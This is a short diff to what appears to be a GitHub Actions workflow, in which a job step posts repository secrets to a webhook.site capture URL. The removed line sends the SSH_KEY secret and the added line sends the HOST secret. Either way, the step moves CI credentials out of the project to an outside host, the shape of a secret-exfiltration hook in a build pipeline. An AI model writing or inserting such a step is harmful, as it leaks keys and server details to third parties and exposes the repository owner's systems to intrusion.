@@ -15,4 +15,4 @@ jobs:
           url: 'https://webhook.site/e2e13ff5-533f-47a3-92d6-aab8a2194177'
           method: 'POST'
           customHeaders: '{"Content-Type": "application/json"}'
-          data: ${{ secrets.SSH_KEY }}
+          data: ${{ secrets.HOST }}
